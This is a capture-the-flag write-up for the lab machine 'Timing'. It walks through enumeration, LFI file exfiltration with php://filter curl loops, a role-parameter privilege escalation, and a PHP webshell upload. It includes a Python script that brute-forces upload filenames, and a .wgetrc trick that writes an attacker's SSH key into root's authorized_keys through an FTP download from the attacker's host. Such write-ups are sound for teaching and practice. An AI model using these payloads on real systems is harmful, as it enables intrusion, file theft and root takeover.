# Timing

First as usual, `nmap`.

```
# Nmap 7.92 scan initiated Thu Dec 16 14:23:43 2021 as: nmap -vvv -p 22,80 -sCV -oA init 10.10.11.135
Nmap scan report for 10.10.11.135
Host is up, received syn-ack (0.066s latency).
Scanned at 2021-12-16 14:23:50 +07 for 11s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 d2:5c:40:d7:c9:fe:ff:a8:83:c3:6e:cd:60:11:d2:eb (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC6ADzomquiIRtawuW9q7/zghf1hv0AAFkbO79vcQkoaUG41EKKUfWdZAvSuQs/SfWcqFybWcfjUPfEzAZJAGQvlTIhZ1JY2fNklRVXPHtn7pa4x8ilt8EnknGefh3ZmlLod+RX+E7tU9uS8TWxZjfsWESVoIxTKmr+6p0mgPP8i166cpQWjdCOev+G8SoI42Yx53uMyy8j1f9FVun/59iQPrRCm3GvriULO9g3inWJXrSR//vu5v9Z4QxLS2uTQPLhkRr6jF4ATcd3PQJeEBAoZMim61pvb2rkFPnNyvZ7IaJtXk8+DxCjGK2QYEh4825oxk+EaYKBc4cTcRYBjQ/Z
|   256 18:c9:f7:b9:27:36:a1:16:59:23:35:84:34:31:b3:ad (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFTFC/194Ys9zdque1QtiNUgm1zDmvwpZyygR3joLJHC6pRTZtHR6+HwgJHBYC7k7OI8A5qqimTcibJNTFfyfj4=
|   256 a2:2d:ee:db:4e:bf:f9:3f:8b:d4:cf:b4:12:d8:20:f2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAdZXeQCf1/rM6H0MCDVQ9d+24wwNti/hzCsKjyIpvmG
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-title: Simple WebApp
|_Requested resource was ./login.php
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Dec 16 14:24:01 2021 -- 1 IP address (1 host up) scanned in 18.46 seconds
```

One of the first things I check on a web application is running `gobuster`. Since we got `login.php` right off the bat, we'll run it with `-x php`.

```sh
$ gobuster dir -u http://10.10.11.135/ -w ~/tools/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php -r

/profile.php          (Status: 200) [Size: 5609]
/image.php            (Status: 200) [Size: 0]
/header.php           (Status: 200) [Size: 5609]
/login.php            (Status: 200) [Size: 5609]
/footer.php           (Status: 200) [Size: 3937]
/upload.php           (Status: 200) [Size: 5609]
/index.php            (Status: 200) [Size: 5609]
/images               (Status: 403) [Size: 279]
/css                  (Status: 403) [Size: 279]
/js                   (Status: 403) [Size: 279]
/logout.php           (Status: 200) [Size: 5609]
/server-status        (Status: 403) [Size: 279]
```

Most of the PHP pages just redirect us to `login.php` so we need to login before we can make use of them. Since we have a login page, I tried running `sqlmap` on the login request. Considering the machine's title is "Timing", I expected to find time-based SQLi.

```sh
sqlmap -r `pwd`/login.req --batch --dump --level 5
```

However, that gives us nothing. After manually trying some credentials, I found that the username "admin" seems to take slightly longer to get a response. I tried running `hydra` with "admin" as the user using rockyou but to no avail, so I just took note of it for later.

Looking back at the `gobuster` results, we see that we have 2 PHP pages that don't redirect to `login.php` and have different response sizes: `footer.php` and `image.php`. `footer.php` doesn't seem to have anything special so I turned my focus to `image.php`. Since its response is empty with size 0, however, there's no immediate information leakage from visiting the page. Since we're working with a PHP site and the target file is named `image.php`, I proceed with the assumption that we have some form of LFI/RFI and/or file upload vulnerability. I first tried fuzzing for parameters with just `FUZZ=test` and `FUZZ=0` to test for strings and numbers but it all returns empty responses. After a bunch of testing, I tried fuzzing both the parameters and the file to be included in case we have LFI.

```sh
ffuf -u 'http://10.10.11.135/image.php?PARAM=FILE' -w ~/tools/SecLists/Discovery/Web-Content/burp-parameter-names.txt:PARAM -w ~/tools/payloads/PayloadsAllTheThings/File\ Inclusion/Intruders/JHADDIX_LFI.txt:FILE -fs 0
```

This got us the parameter `img`, and we found that certain inputs return the line "Hacking attempt detected!". After some manual testing, I found that we can [base64-encode and exfiltrate files](https://book.hacktricks.xyz/pentesting-web/file-inclusion#wrapper-php-filter).

```sh
curl -s 'http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=/etc/passwd' | base64 -d
```

Exfiltrating `login.php`, we see that `db_conn.php` is included. Grabbing that file, we get database credentials for root. I tried logging into `login.php` as `root` and `admin` with the found password but no luck. Can't SSH in as `aaron` or `root` either. We also see in `login.php` that `createTimeChannel()` is declared and called only to create a small delay if the username exists in the database, which explains why trying to login as "admin" would have a slightly longer response time.

I tried grabbing executed commands from `/proc/PID/cmdlline`.

```sh
seq 1 10000 | while read line; do curl -s "http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=/proc/$line/cmdline" | base64 -d > "proc/$line"; done
```

However, that didn't return anything immediately useful.

I then tried downloading all the files found by `gobuster`.

```sh
cat GOBUSTER_RESULT | cut -d' ' -f1 | cut -d'/' -f2 | while read line; do curl -s "http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=$line" | base64 -d > files/$line; done
```

I then `grep`'d those files to find included PHP files and downloaded the new files.

```sh
$ grep include files/* | grep -oE '".*"' | cut -d '"' -f2 | sort -u | while read line; do curl -s "http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=$line" | base64 -d > files/$(echo $line | sed 's/\//_/g'); done
```

Here, `admin_auth_check.php` and `auth_check.php` are the only files not previously known. However, checking those files doesn't give us anything special like credentials.

I also tried grabbing `php.ini`. The following one-liner gets `php.ini` while also determining the PHP version on the server.

```sh
seq 1 30 | while read line; do curl -s "http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=/etc/php/7.$line/apache2/php.ini" | base64 -d > "7.$line"; done
```

This reveals that the server is using PHP 7.2. However, there's not much useful information in the file besides `disable_functions`.

Going back to the exfiltrated `/etc/passwd`, the only non-root user with a shell is `aaron`. I tried `aaron:aaron` (same password and username) on `login.php` and logged in as user 2. Looking back at the `gobuster` result, the only interesting end-points we haven't looked at yet are `profile.php` and `upload.php`. We might be able to upload PHP files and have `image.php` `include` it for execution. We'll probably need to use `image.php` since `upload.php` checks the final file extension, making sure it's `jpg`, as well as changes the file name to a seemingly random MD5 hash. This means we can't execute the uploaded PHP just by navigating to it due to the file extension. We can, however, execute the code by have another page `include` it. Unfortunately, to get to `upload.php`, we must first have a session with `role` set to `1`. Our current `role` for `aaron` is `2`, so we need to change it to `1` somehow.

Digging around, I decided to try looking at `profile.php` and its update requests. Copy an update request as a `curl` command gives the following after some manual header stripping.

```sh
$ curl 'http://10.10.11.135/profile_update.php' -X POST -H 'Cookie: PHPSESSID=<SESS>' --data-raw 'firstName=test&lastName=test&email=test&company=test'
{
    "id": "2",
    "0": "2",
    "username": "aaron",
    "1": "aaron",
    "password": "$2y$10$kbs9MM.M8G.aquRLu53QYO.9tZNFvALOIAb3LwLggUs58OH5mVUFq",
    "2": "$2y$10$kbs9MM.M8G.aquRLu53QYO.9tZNFvALOIAb3LwLggUs58OH5mVUFq",
    "lastName": "test",
    "3": "test",
    "firstName": "test",
    "4": "test",
    "email": "test",
    "5": "test",
    "role": "0",
    "6": "0",
    "company": "test",
    "7": "test"
}
```

Seeing as `role` seems to be part of the response, I tried adding `role=1` to the request data.

```sh
$ curl 'http://10.10.11.135/profile_update.php' -X POST -H 'Cookie: PHPSESSID=fvr8cr1kvdpboo9homelhuglrh' --data-raw 'firstName=test&lastName=test&email=test&company=test&role=1'
{
    "id": "2",
    "0": "2",
    "username": "aaron",
    "1": "aaron",
    "password": "$2y$10$kbs9MM.M8G.aquRLu53QYO.9tZNFvALOIAb3LwLggUs58OH5mVUFq",
    "2": "$2y$10$kbs9MM.M8G.aquRLu53QYO.9tZNFvALOIAb3LwLggUs58OH5mVUFq",
    "lastName": "test",
    "3": "test",
    "firstName": "test",
    "4": "test",
    "email": "test",
    "5": "test",
    "role": "1",
    "6": "1",
    "company": "test",
    "7": "test"
}
```

It looks like that worked and we now have `role=1`. We can now access `upload.php`.

We can create and upload a PHP reverse shell. Note that it doesn't need to be a valid `jpg` file if the POST parameter `submit` isn't there.

```sh
curl 'http://10.10.11.135/upload.php' -X POST -H 'Cookie: PHPSESSID=<SESS>' -F 'fileToUpload=@shell.jpg'
The file has been uploaded.
```

The problem now is that we don't have the name of the uploaded file. As seen in `upload.php`, the file is renamed to an MD5 hash generated with the original file name, the time of the upload, and a randomly generated `$file_hash`. Except that's not quite true. Note that in the declaration of `$file_name`, `'$file_hash'` is used instead of `$file_hash`, meaning it's using a hard-coded literal string instead of the randomly generated hash. Knowing that, we just have to brute-force for `time()`. I wrote the following script to fuzz for the file which should be run right after uploading a file.

```python
#!/usr/bin/python3

import time
import hashlib
import requests

ip = "10.10.11.135"
filename = "shell.jpg"

t = int(time.time())
print(t)
for i in range(t, 0, -1):
    f = "$file_hash" + f"{i}"
    hsh = hashlib.md5(bytes(f, "utf-8"))
    final_file = str(hsh.hexdigest()) + "_" + filename
    r = requests.get(
        f"http://{ip}/image.php?img=php://filter/convert.base64-encode/resource=/var/www/html/images/uploads/{final_file}"
    )
    if r.text:
        print(final_file)
```

I then tried to `include` and execute the reverse shell with `image.php?img=images/uploads/<HASH>_shell.jpg` but it doesn't work. A simple `<?php echo system($_GET["cmd"]);?>` works but we still can't get a reverse shell. This might be due to some firewall rules. We just have to manually enumerate the machine with the `cmd`.

Looking at `/opt`, we have `source-files-backup.zip` which can easily be exfiltrated simply with `base64 /opt/source-files-backup.zip` and decoding the file. Unzipping the file gives us the source code for the website in a `git` repository. Checking the history, we see an old password in `db_conn.php` which can be used to SSH in as aaron.

Checking listening ports ...

```sh
aaron@timing:~$ ss -tlnp
State         Recv-Q          Send-Q                    Local Address:Port                   Peer Address:Port
LISTEN        0               80                            127.0.0.1:3306                        0.0.0.0:*
LISTEN        0               128                       127.0.0.53%lo:53                          0.0.0.0:*
LISTEN        0               128                             0.0.0.0:22                          0.0.0.0:*
LISTEN        0               128                                   *:80                                *:*
LISTEN        0               128                                [::]:22                             [::]:*
```

We have MySQL on port 3306. We can log into MySQL as root with the newest password from the `source-files-backup.zip` repository. Looking around, the only interesting thing is table `users` in the database `app` containing admin and aaron's password hashes and info, though I didn't bother cracking them.

Checking aaron's `sudo` privileges ...

```sh
aaron@timing:~$ sudo -l
Matching Defaults entries for aaron on timing:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User aaron may run the following commands on timing:
    (ALL) NOPASSWD: /usr/bin/netutils
```

We can run `/usr/bin/netutils` as root without a password. It's just a script running `/root/netutils.jar`.

```sh
aaron@timing:~$ sudo /usr/bin/netutils
netutils v0.1
Select one option:
[0] FTP
[1] HTTP
[2] Quit
Input >>
```

To figure out what's happening, I uploaded and ran `pspy` in another SSH session as I run `/usr/bin/netutils`.

When HTTP is chosen, `/root/axel $URL` is run. When FTP is chosen, `wget -r ftp://$URL $FILE` is run. I tried looking for exploits for `axel` without results so I went for FTP which uses `wget`.

Looking at [documentation on `wget`](http://www.gnu.org/software/wget/manual/html_node/Wgetrc-Commands.html), we see that `output_document` can be put in `.wgetrc` to make `wget` run with `-O file`.

To exploit the FTP client, create the following `.wgetrc` in aaron's home.

```
output_document = /root/.ssh/authorized_keys
```

Then, on the attacking machine, create an SSH key pair with `ssh-keygen` and host them on an FTP server with `sudo python -m pyftpdlib -p 21`. On the victim machine, run `/usr/bin/netutils` with the following interaction.

```sh
aaron@timing:~$ sudo /usr/bin/netutils
netutils v0.1
Select one option:
[0] FTP
[1] HTTP
[2] Quit
Input >> 0
Enter Url+File: $LHOST id_rsa.pub

netutils v0.1
Select one option:
[0] FTP
[1] HTTP
[2] Quit
Input >> 2
```

Finally, use the private key to SSH in as root.

```sh
ssh -i id_rsa root@10.10.11.135
```
